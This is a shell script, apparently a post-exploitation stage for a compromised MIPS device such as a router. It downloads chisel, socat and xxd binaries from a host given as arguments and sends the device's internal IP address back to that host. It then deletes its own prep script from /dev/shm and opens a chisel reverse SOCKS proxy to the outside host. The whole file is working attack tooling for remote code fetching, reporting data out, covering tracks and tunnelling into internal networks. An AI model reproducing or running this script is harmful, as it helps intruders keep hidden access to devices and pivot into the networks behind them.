#!/bin/sh

FILEPATH=srv
OUT_PATH=/usr/local/bin
CHISEL_BIN=chisel-mips32
SOCAT_BIN=socat-mips32
XXD_BIN=xxd-mips32

CHISEL_OUT_BIN=ch
SOCAT_OUT_BIN=so
XXD_OUT_BIN=x

PREP_SCRIPT=/dev/shm/prep.sh

GET_INTERNAL_IP=$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p)


# Prepare file destination and transfer files
mkdir -p ${OUT_PATH}
curl http://${1}:${2}/${FILEPATH}/${CHISEL_BIN} -o ${OUT_PATH}/${CHISEL_OUT_BIN}
curl http://${1}:${2}/${FILEPATH}/${SOCAT_BIN} -o ${OUT_PATH}/${SOCAT_OUT_BIN}
curl http://${1}:${2}/${FILEPATH}/${XXD_BIN} -o ${OUT_PATH}/${XXD_OUT_BIN}
chmod +x ${OUT_PATH}/${CHISEL_OUT_BIN}
chmod +x ${OUT_PATH}/${SOCAT_OUT_BIN}
chmod +x ${OUT_PATH}/${XXD_OUT_BIN}

# Report back internal IP address of device in hex
curl -d 'ip':$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | x -p) -H 'Content-Type: application/json' -X POST http://${1}:${2}/${GET_INTERNAL_IP}

# Terminate web server and delete prep script
curl -X QUIT http://${1}:${2}
rm ${PREP_SCRIPT}

# This sleep is just here until chisel is integrated into takeover
sleep 5

# Start reverse proxy
${OUT_PATH}/${CHISEL_OUT_BIN} client ${1}:${2} R:socks &

